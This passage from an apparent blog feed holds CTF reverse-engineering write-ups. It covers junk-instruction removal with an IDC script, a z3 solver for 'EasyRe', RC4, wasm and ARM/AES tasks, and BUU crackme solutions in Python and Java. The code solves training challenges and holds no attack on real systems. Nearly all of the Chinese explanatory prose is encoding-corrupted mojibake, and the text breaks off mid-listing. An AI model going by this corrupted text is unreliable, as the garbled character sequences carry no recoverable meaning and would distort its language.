title="EasyRe"></a>EasyRe</h2><p>ä¸€å¼€å§‹çŸ¥é“æ˜¯è€ƒçš„èŠ±æŒ‡ä»¤ï¼Œä¹Ÿè‡ªå·±æ‰‹åŠ¨å»äº†ä¸€éƒ¨åˆ†ï¼Œä½†æ˜¯å‘ç°å¤ªå¤šäº†å°±æ”¾å¼ƒäº†ï¼ŒæœŸé—´æœ‰è§‚å¯Ÿåˆ°æœ‰ä¸€ä¸ªç¥å¥‡çš„å­—ç¬¦ä¸²ï¼Œçœ‹wpéƒ½è¯´æ˜¯flagï¼Œåæ¥å®˜æ–¹wpæ‰çŸ¥é“æ˜¯å‡ºé¢˜äººå¿˜å»äº†ã€‚ã€‚ã€‚</p><p>æœ€ç»ˆè¦çš„å°±æ˜¯è¿™ä¸ªå‡½æ•°ï¼š</p><p><img src="/2021/11/15/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/image-20211115162141448.png" alt="image-20211115162141448"></p><p>è¿›å»ä¹‹åå‘ç°ä¸èƒ½ç›´æ¥f5ï¼Œ</p><p><img src="/2021/11/15/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/image-20211115162216904.png" alt="image-20211115162216904"></p><p>æ˜¯èŠ±æŒ‡ä»¤æ²¡è·‘äº†ã€‚</p><pre><code>idcè„šæœ¬ï¼š</code></pre><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//IDCè„šæœ¬</span></span><br><span class="line"><span class="keyword">auto</span> addr_start =<span class="number">0x007217A0</span>;<span class="comment">//å‡½æ•°èµ·å§‹åœ°å€</span></span><br><span class="line"><span class="keyword">auto</span> addr_end = <span class="number">0x00721E58</span>;<span class="comment">//å‡½æ•°ç»“æŸåœ°å€</span></span><br><span class="line"><span class="keyword">auto</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=addr_start;i&lt;addr_end;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(Dword(i) == <span class="number">0x1E8</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span> ; j&lt;<span class="number">6</span>; j++,i++ )&#123;</span><br><span class="line">            PatchByte(i,<span class="number">0x90</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        i=i+<span class="number">4</span>;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span> ; j&lt;<span class="number">3</span>; j++,i++ )&#123;</span><br><span class="line">            PatchByte(i,<span class="number">0x90</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        i=i+<span class="number">10</span>;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span> ; j&lt;<span class="number">3</span>; j++,i++ )&#123;</span><br><span class="line">            PatchByte(i,<span class="number">0x90</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        i=i+<span class="number">5</span>;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span> ; j&lt;<span class="number">1</span>; j++,i++ )&#123;</span><br><span class="line">            PatchByte(i,<span class="number">0x90</span>);</span><br><span class="line">        &#125;   </span><br><span class="line">        i=i+<span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span> ; j&lt;<span class="number">2</span>; j++,i++ )&#123;</span><br><span class="line">            PatchByte(i,<span class="number">0x90</span>);</span><br><span class="line">        &#125;     </span><br><span class="line">        i--;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><img src="/2021/11/15/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/image-20211115162446951.png" alt="image-20211115162446951"></p><pre><code>runåï¼Œé€‰ä¸­æŒ‰uï¼ˆundefinedï¼‰ï¼Œå†åœ¨å¼€å¤´æŒ‰på»ºï¼ˆCreate Functionï¼‰ï¼š</code></pre><p><img src="/2021/11/15/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/image-20211115163225826.png" alt="image-20211115163225826"></p><p>æ¥ä¸‹æ¥å°±æ˜¯z3è§£äº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#æå–å‡ºv4çš„æ•°æ®</span></span><br><span class="line">v4 = [<span class="number">0x271e150c</span>,<span class="number">0x3b322920</span>,<span class="number">0x5f564d44</span>,<span class="number">0x736a6158</span>,<span class="number">0x978e857c</span>,<span class="number">0xaba29990</span>,<span class="number">0xcfc6bdb4</span>,<span class="number">0xe3dad1c8</span>,]</span><br><span class="line"></span><br><span class="line">v5 = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#mainå‡½æ•°ä¸­ç”¨äºæ¯”è¾ƒçš„æ•°æ®</span></span><br><span class="line">data = [<span class="number">0x0EEE8B042</span>,<span class="number">0x57D0EE6C</span>,<span class="number">0x0F3F54B32</span>,<span class="number">0x0D3F0B7D6</span>,<span class="number">0x0A61C389</span>,<span class="number">0x38C7BA40</span>,<span class="number">0x0C3D9E2C</span>,<span class="number">0x0D64A9284</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x0=BitVec(<span class="string">&#x27;x0&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">x1=BitVec(<span class="string">&#x27;x1&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">x2=BitVec(<span class="string">&#x27;x2&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">x3=BitVec(<span class="string">&#x27;x3&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">x4=BitVec(<span class="string">&#x27;x4&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">x5=BitVec(<span class="string">&#x27;x5&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">x6=BitVec(<span class="string">&#x27;x6&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">x7=BitVec(<span class="string">&#x27;x7&#x27;</span>,<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">s = z3.Solver()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(x1))</span><br><span class="line"></span><br><span class="line">v5[<span class="number">0</span>]=x0^v4[<span class="number">2</span>]</span><br><span class="line">v5[<span class="number">1</span>]=x1^v4[<span class="number">1</span>]</span><br><span class="line">v5[<span class="number">2</span>]=x2^v4[<span class="number">0</span>]</span><br><span class="line">v5[<span class="number">3</span>]=x3^v4[<span class="number">7</span>]</span><br><span class="line">v5[<span class="number">4</span>]=x4^v4[<span class="number">6</span>]</span><br><span class="line">v5[<span class="number">5</span>]=x5^v4[<span class="number">5</span>]</span><br><span class="line">v5[<span class="number">6</span>]=x6^v4[<span class="number">4</span>]</span><br><span class="line">v5[<span class="number">7</span>]=x7^v4[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    v5[i] ^= (v5[i] &lt;&lt; <span class="number">7</span>)</span><br><span class="line">    v5[i] ^= v4[(i*<span class="number">7</span>+<span class="number">3</span>)%<span class="number">8</span>]</span><br><span class="line">    v5[i] ^= v5[(i*<span class="number">5</span>+<span class="number">3</span>)%<span class="number">8</span>]</span><br><span class="line">    v5[i] ^= (v5[i]&lt;&lt;<span class="number">13</span>)</span><br><span class="line">    v5[i] ^= v4[(i*<span class="number">7</span>+<span class="number">5</span>)%<span class="number">8</span>]</span><br><span class="line">    v5[i] ^= (v5[i]&lt;&lt;<span class="number">17</span>)</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(v5[<span class="number">0</span>])</span><br><span class="line">s.add(data[<span class="number">0</span>]==v5[<span class="number">0</span>],</span><br><span class="line">data[<span class="number">1</span>]==v5[<span class="number">1</span>],</span><br><span class="line">data[<span class="number">2</span>]==v5[<span class="number">2</span>],</span><br><span class="line">data[<span class="number">3</span>]==v5[<span class="number">3</span>],</span><br><span class="line">data[<span class="number">4</span>]==v5[<span class="number">4</span>],</span><br><span class="line">data[<span class="number">5</span>]==v5[<span class="number">5</span>],</span><br><span class="line">data[<span class="number">6</span>]==v5[<span class="number">6</span>],</span><br><span class="line">data[<span class="number">7</span>]==v5[<span class="number">7</span>],</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(s.check())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s.model())</span><br></pre></td></tr></table></figure><p>out:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[x1 = 828781622,</span><br><span class="line">x7 = 943285560, </span><br><span class="line">x0 = 1630954594, </span><br><span class="line">x3 = 909140836, </span><br><span class="line">x5 = 1633759329, </span><br><span class="line">x4 = 825516597, </span><br><span class="line">x6 = 879047012, </span><br><span class="line">x2 = 862085687]</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯intè½¬chrï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python</span></span><br><span class="line">x1 = <span class="number">828781622</span></span><br><span class="line">x7 = <span class="number">943285560</span></span><br><span class="line">x0 = <span class="number">1630954594</span></span><br><span class="line">x3 = <span class="number">909140836</span></span><br><span class="line">x5 = <span class="number">1633759329</span></span><br><span class="line">x4 = <span class="number">825516597</span></span><br><span class="line">x6 = <span class="number">879047012</span></span><br><span class="line">x2 = <span class="number">862085687</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">IntToChar</span>(<span class="params"> x </span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        a = x%<span class="number">0x100</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(a),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        x = x//<span class="number">0x100</span></span><br><span class="line">IntToChar(x0)</span><br><span class="line">IntToChar(x1)</span><br><span class="line">IntToChar(x2)</span><br><span class="line">IntToChar(x3)</span><br><span class="line">IntToChar(x4)</span><br><span class="line">IntToChar(x5)</span><br><span class="line">IntToChar(x6)</span><br><span class="line">IntToChar(x7)</span><br></pre></td></tr></table></figure><h2 id="findme"><a href="#findme" class="headerlink" title="findme"></a>findme</h2><p>çœ‹wpè¯´æ˜¯RC4ï¼Œç®€å•äº†è§£äº†ä¸‹ï¼š</p><p>åˆ†ä¸‰æ­¥ï¼š</p><ol><li> åˆå§‹åŒ–çŠ¶æ€å‘é‡Så’Œæš‚æ—¶å‘é‡Tï¼Œé•¿åº¦éƒ½ä¸º256</li><li> åˆå§‹æ’åˆ—S</li><li> äº§ç”Ÿå¯†é’¥æµk[]</li></ol><p>é‡è¦çš„å…¶å®å°±æ˜¯ç¬¬ä¸€ä¸ªå‡½æ•°ï¼š</p><p><img src="/2021/11/15/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/image-20211115170155215.png" alt="image-20211115170155215"></p><p>ä¹ä¸€çœ‹ç¬¬äºŒä¸ªå‡½æ•°æ—¶strcmpï¼Œå…¶å®ä¸æ˜¯ï¼Œåœ¨ç¬¬ä¸€ä¸ªå‡½æ•°å†…éƒ¨å·²ç»æ”¹äº†ï¼Œæ”¹ä¸ºRC4äº†ã€‚</p><p><img src="/2021/11/15/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/image-20211115170329633.png" alt="image-20211115170329633"></p><p><img src="/2021/11/15/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/image-20211115170430865.png" alt="image-20211115170430865"></p><p><img src="/2021/11/15/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/image-20211115172343689.png" alt="image-20211115172343689"></p><pre><code>keyä¹ŸçŸ¥é“ï¼Œç›´æ¥åœ¨çº¿è§£å°±ok</code></pre><h2 id="Eat-something"><a href="#Eat-something" class="headerlink" title="Eat_something"></a>Eat_something</h2><blockquote><p>wasmé€†å‘</p><p>  å‚è€ƒï¼š</p><pre><code> https://xz.aliyun.com/t/5170 https://www.52pojie.cn/thread-1438499-1-1.html</code></pre></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone --recursive https://github.com/WebAssembly/wabt</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install cmake</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cd</span> wabt</span><br><span class="line">$ mkdir build</span><br><span class="line">$ <span class="built_in">cd</span> build</span><br><span class="line">$ cmake .. -DBUILD_TESTS=OFF</span><br><span class="line">$ cmake --build .</span><br></pre></td></tr></table></figure><p>æœ¬åœ°ç¯å¢ƒæ­å»ºäº†åŠå¤©ï¼Œæ­å»ºå¥½äº†ä½†æ˜¯ä¸å¤ªä¼šç”¨ã€‚ã€‚ã€‚ç›´æ¥ç”¨çš„ç°æˆçš„å·¥å…·ï¼š</p><p>meminitï¼š</p><p><img src="/2021/11/15/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/image-20211115231338025.png" alt="image-20211115231338025"></p><p><img src="/2021/11/15/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/image-20211115231410644.png" alt="image-20211115231410644"></p><p>åˆ°è¿™é‡Œçœ‹ä¸ä¸‹å»äº†ï¼Œå…³é”®ä»£ç æœ‰ç‚¹çœ‹ä¸æ‡‚ï¼š</p><blockquote><p>æ ¸å¿ƒç®—æ³•å°±æ˜¯è¿™ä¸€å¥<code>v13 != (i32_load(w2c_memory, v16 + 12LL) ^ (2 * v10))</code></p><p>ç¿»è¯‘ä¸‹å°±æ˜¯<code>enc[i] != i ^ (flag[i] * 2)</code></p></blockquote><p>ä¹‹åçš„å°±å¥½åšäº†ã€‚</p><h2 id="power"><a href="#power" class="headerlink" title="power"></a>power</h2><pre><code>armæ±‡ç¼–</code></pre><p>å®‰è£…ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gcc-arm-linux-gnueabi</span><br><span class="line"></span><br><span class="line">arm-linux-gnueabi-as power -o power.o</span><br></pre></td></tr></table></figure><p>æç¤ºå¾ˆæ¸…æ¥šäº†aesï¼š</p><p><img src="/2021/11/15/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/image-20211115211755931.png" alt="image-20211115211755931"></p><p>æ˜¾ç¤ºæ˜¯cbcå…¶å®æ˜¯ecbï¼š</p><p><img src="/2021/11/15/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/image-20211115213545044.png" alt="image-20211115213545044"></p><p>æœ€è¿‘ä¼šå¤§åŠ›å¤ç°ä¹‹å‰æ¯”èµ›çš„wpã€‚</p><blockquote><p>  å‚è€ƒ:</p><ul><li>  <a href="https://wp.n03tack.top/posts/14620/#Pwn">https://wp.n03tack.top/posts/14620/#Pwn</a></li><li>  <a href="https://www.cnblogs.com/LynneHuan/p/15522466.html?continueFlag=9efa2d1c6fec8469bacde1d08e042fa4">https://www.cnblogs.com/LynneHuan/p/15522466.html?continueFlag=9efa2d1c6fec8469bacde1d08e042fa4</a></li><li>  canaryç»•è¿‡å§¿åŠ¿ï¼š<a href="https://xz.aliyun.com/t/4657#toc-3">https://xz.aliyun.com/t/4657#toc-3</a></li><li>  <a href="https://song-10.gitee.io/2020/01/01/pwn-2020-01-01-pwn-canary/">https://song-10.gitee.io/2020/01/01/pwn-2020-01-01-pwn-canary/</a></li><li>  <a href="https://xz.aliyun.com/t/5170">https://xz.aliyun.com/t/5170</a></li><li>  <a href="https://www.52pojie.cn/thread-1438499-1-1.html">https://www.52pojie.cn/thread-1438499-1-1.html</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;p&gt;éƒ½æ˜¯èµ›åå†™çš„ï¼Œwtclã€‚&lt;/p&gt;
&lt;p&gt;è¿˜æ˜¯å­¦åˆ°äº†å¾ˆå¤šã€‚&lt;/p&gt;
&lt;h1 id=&quot;PWN&quot;&gt;&lt;a href=&quot;#PWN&quot; class=&quot;headerlink&quot; title=&quot;PWN&quot;&gt;&lt;/a&gt;PWN&lt;/h1&gt;&lt;h2 id=&quot;bbbaby&quot;&gt;&lt;a h</summary>
      
    
    
    
    
    <category term="WriteUp" scheme="http://example.com/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>BUU_REåˆ·é¢˜</title>
    <link href="http://example.com/2021/11/07/BUU-RE-0x01-0x1F/"/>
    <id>http://example.com/2021/11/07/BUU-RE-0x01-0x1F/</id>
    <published>2021-11-06T16:00:00.000Z</published>
    <updated>2021-12-22T07:19:42.154Z</updated>
    
    <content type="html"><![CDATA[<p>ä¹‹å‰å†™è¿‡ä¸€éƒ¨åˆ†reçš„é¢˜è§£ï¼Œæœ€è¿‘åˆæœ‰ç‚¹æƒ³æreäº†ï¼Œé‡æ¥å§ã€‚(ä»01å¼€å§‹è®¡)</p><h1 id="0x01-ç®€å•æ³¨å†Œå™¨"><a href="#0x01-ç®€å•æ³¨å†Œå™¨" class="headerlink" title="0x01.ç®€å•æ³¨å†Œå™¨"></a>0x01.ç®€å•æ³¨å†Œå™¨</h1><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211021234037840.png" alt="image-20211021234037840"></p><p>ç®€å•çš„æ›¿æ¢å’Œç¿»è½¬å­—ç¬¦ä¸²</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="string">&quot;dd2940c04462b4dd7c450528835cca15&quot;</span></span><br><span class="line">x = <span class="built_in">list</span>(x)</span><br><span class="line">x[<span class="number">2</span>] = <span class="built_in">chr</span>((<span class="built_in">ord</span>(x[<span class="number">2</span>]) + <span class="built_in">ord</span>(x[<span class="number">3</span>])) - <span class="number">50</span>)</span><br><span class="line">x[<span class="number">4</span>] = <span class="built_in">chr</span>((<span class="built_in">ord</span>(x[<span class="number">2</span>]) + <span class="built_in">ord</span>(x[<span class="number">5</span>])) - <span class="number">48</span>)</span><br><span class="line">x[<span class="number">30</span>] = <span class="built_in">chr</span>((<span class="built_in">ord</span>(x[<span class="number">31</span>]) + <span class="built_in">ord</span>(x[<span class="number">9</span>])) - <span class="number">48</span>)</span><br><span class="line">x[<span class="number">14</span>] = <span class="built_in">chr</span>((<span class="built_in">ord</span>(x[<span class="number">27</span>]) + <span class="built_in">ord</span>(x[<span class="number">28</span>])) - <span class="number">97</span>)</span><br><span class="line">x = x[::-<span class="number">1</span>]</span><br><span class="line">x = <span class="string">&#x27;&#x27;</span>.join(x)</span><br><span class="line"><span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure><h1 id="0x02-Javaé€†å‘è§£å¯†"><a href="#0x02-Javaé€†å‘è§£å¯†" class="headerlink" title="0x02.Javaé€†å‘è§£å¯†"></a>0x02.Javaé€†å‘è§£å¯†</h1><p>ä»£ç é€»è¾‘å¾ˆæ¸…æ™°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> defpackage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* renamed from: Reverse  reason: default package */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Reverse</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner s = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;Please input the flag ï¼š&quot;</span>);</span><br><span class="line">        String str = s.next();</span><br><span class="line">        System.out.println(<span class="string">&quot;Your input is ï¼š&quot;</span>);</span><br><span class="line">        System.out.println(str);</span><br><span class="line">        Encrypt(str.toCharArray());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Encrypt</span><span class="params">(<span class="keyword">char</span>[] arr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] KEY;</span><br><span class="line">        ArrayList&lt;Integer&gt; Resultlist = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span> c : arr) &#123;</span><br><span class="line">            Resultlist.add(Integer.valueOf((c + <span class="string">&#x27;@&#x27;</span>) ^ <span class="number">32</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        ArrayList&lt;Integer&gt; KEYList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i : <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">136</span>, <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span>&#125;) &#123;</span><br><span class="line">            KEYList.add(Integer.valueOf(i));</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;Result:&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (Resultlist.equals(KEYList)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Congratulationsï¼&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;Errorï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flag = [<span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>,</span><br><span class="line">        <span class="number">148</span>, <span class="number">136</span>, <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag[i] = <span class="built_in">chr</span>((flag[i] - <span class="built_in">ord</span>(<span class="string">&#x27;@&#x27;</span>)) ^ <span class="number">0x20</span>)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h1 id="0x03-findit"><a href="#0x03-findit" class="headerlink" title="0x03.findit"></a>0x03.findit</h1><p>å°±æ˜¯ä¸ªå‡¯æ’’</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.findit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.ActionBarActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.MenuItem;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span 